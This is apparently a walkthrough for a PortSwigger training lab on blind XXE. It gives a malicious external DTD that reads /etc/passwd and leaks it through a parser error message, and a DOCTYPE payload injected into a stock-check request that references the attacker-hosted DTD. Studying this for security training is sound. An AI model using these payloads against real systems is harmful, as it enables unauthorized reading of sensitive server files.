## Exploiting blind XXE to retrieve data via error messages

## Solution

Create a malicious DTD - On the exploit server create a malicious DTD file with the following contents,

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

Host this malicious.dtd file in our exploit server.

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/e584fb91-05fc-4a85-bd23-0424c0bdf3e8">

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.


Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ff5005ab-1488-42bd-a895-61a3b3678a64">


You should see an error message containing the contents of the /etc/passwd file.


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/92018db0-395a-46a1-b8a2-574ccfa87d51">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/d9f6ff63-207a-41cf-92ac-0a26b81d9f5e">
